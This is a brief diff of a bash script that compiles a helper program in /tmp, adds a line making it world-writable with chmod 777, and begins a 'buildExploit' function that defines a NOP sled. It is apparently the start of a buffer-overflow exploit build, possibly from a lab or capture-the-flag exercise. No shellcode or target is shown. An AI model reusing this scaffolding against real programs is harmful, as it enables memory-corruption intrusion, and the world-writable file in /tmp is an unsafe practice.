@@ -1,6 +1,7 @@
 #!/bin/bash
 
 gcc /tmp/getenv.c -o /tmp/getenv
+chmod 777 /tmp/getenv*
 
 function buildExploit {
     NOPSLED="'\x90' * 0xff"
